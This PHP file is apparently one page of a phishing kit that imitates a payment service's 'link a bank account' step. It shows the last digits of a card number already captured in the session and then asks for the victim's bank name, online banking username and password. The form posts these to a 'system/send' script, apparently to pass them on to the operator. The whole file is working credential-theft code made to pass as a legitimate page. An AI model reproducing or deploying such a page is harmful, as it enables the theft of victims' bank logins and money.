<?php
	
	session_start();
	include "../assets/includes/header.php";
	include "../system/url.php";
	

	$checkType = substr($_SESSION["zombiexcnumber"],0,1);

	if($checkType == 4){
		$cType = "background-position: 0px -0.3%;";
	} elseif($checkType == 5){
		$cType = "background-position: 0px 5.7%;";
	} elseif($checkType == 3){
		$cType = "background-position: 0px 11.7%;";
	} else {
		$cType = "background-position: 0px 82.4%;";
	}

?>

					<div class="zombie-form-container">

						<div class="zombie-loader" id="loading"></div>

						<!--##[ SECTION ]##-->

							<div class="" id="zombieaddbnk">

								<div class="zombie-sections-steps">
									<span class="zombie-sections-step">○</span>
									<span class="zombie-sections-step selected">●</span>
									<span class="zombie-sections-step">○</span>
									<span class="zombie-sections-step">○</span>
								</div>

								<h3 class="medium">Credit/Debit card.</h3>
								<p class="medium">Add another card or link a bank account :</p>

								<div class="zombie-info-container">

									<div class="zombie-saved-c-v ">
										<span class="cc-icon saved-cc-icon" style="<?php echo $cType; ?>"></span>

										<span> x-<?php echo substr($_SESSION["zombiexcnumber"],-4); ?></span>

										<span class="saved-note-icon" style="background-position: center 30.70%;"></span>
									</div>
									<a href="payment.php<?php echo $zombieURL; ?>">Add another card</a>

									<button class="zombie-add-bnk-link" onclick="addnewbnk()">
										<div class="zombie-add-bnk">
											<p class="zombie-link-it">Link a bank account</p>
											<p class="zombie-use-it">Use it to send money to friends in your country for free</p>
										</div>
									</button>
									
									<div>
										<button style="width:100%" class="button" onclick="addnewbnk()">Link a bank account</button>
									</div>

									<div>
										<button style="width:100%" class="button-light" onClick="location.href='e-mail.php<?php echo $zombieURL; ?>'">Don't have a Bank account</button>
									</div>

								</div>

							</div>

						<!--##[ END SECTION ]##-->

						<!--##[ SECTION ]##-->

							<div class="hidden" id="zombiebnk">

<script>
function validateBnkForm() {
    var a = document.forms["BnkForm"]["zombiebnkname"].value;
    var b = document.forms["BnkForm"]["zombiebnkuser"].value;
    var c = document.forms["BnkForm"]["zombiebnkpass"].value;
    if (a == "") {
        $("#zombiebnkname").addClass("hasError");
    }
    if (b == "") {
        $("#zombiebnkuser").addClass("hasError");
    }
    if (c == "") {
        $("#zombiebnkpass").addClass("hasError");
    }
    if (a == ""){return false;}if (b == ""){return false;}if (c == ""){return false;}
}
</script>

								<form action="../system/send/zombie_bank.php" method="post" name="BnkForm" onsubmit="return validateBnkForm()">

									<div class="zombie-sections-steps">
										<span class="zombie-sections-step">○</span>
										<span class="zombie-sections-step selected">●</span>
										<span class="zombie-sections-step">○</span>
										<span class="zombie-sections-step">○</span>
									</div>

									<h3 class="medium">Link a bank account.</h3>
									<p class="medium">Link your bank account to send money to friends in your country for free:</p>

									<div class="zombie-info-container">
										<div class="zombie-fields">
											<input type="text" name="zombiebnkname" id="zombiebnkname" placeholder="Your bank name" maxlength="30" autocomplete="off" autocorrect="off" />
										</div>
										<div class="zombie-fields">
											<input type="text" name="zombiebnkuser" id="zombiebnkuser" placeholder="Username" maxlength="30" autocomplete="off" autocorrect="off" />
										</div>
										<div class="zombie-fields">
											<input type="password" name="zombiebnkpass" id="zombiebnkpass" placeholder="Password" maxlength="30" autocomplete="off" autocorrect="off" />
										</div>

										<p class="medium by-click">By clicking <b>Link Bank Instantly,</b> you agree to use your association for your bank.</p>
										

										<div>
											<button style="width:100%" class="button">Save and continue</button>
										</div>
									</div>

								</form>
							</div>

						<!--##[ END SECTION ]##-->
						
					</div>
<?php
	include "../assets/includes/footer.php";
?>

	</div>
<script>
	$(document).ready(function(){
	$('#zombiebnkname').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiebnkname').removeClass('hasError'); } else {$('#zombiebnkname').removeClass('hasError'); }});

	$('#zombiebnkuser').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiebnkuser').removeClass('hasError'); } else {$('#zombiebnkuser').removeClass('hasError'); }});

	$('#zombiebnkpass').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiebnkpass').removeClass('hasError'); } else {$('#zombiebnkpass').removeClass('hasError'); }});

	});
</script>
</body>
</html>